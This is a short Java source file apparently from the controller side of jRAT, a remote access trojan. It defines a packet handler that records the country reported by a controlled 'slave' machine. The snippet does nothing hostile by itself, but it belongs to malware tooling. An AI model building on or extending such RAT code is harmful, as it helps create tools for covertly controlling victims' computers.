package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.settings.Settings;

import java.io.DataInputStream;

public class Packet47InitCountry extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String country = slave.readLine().toLowerCase();

		if (!Settings.getGlobal().getBoolean("geoip")) {
			slave.setCountry(country);	
		}

	}

}
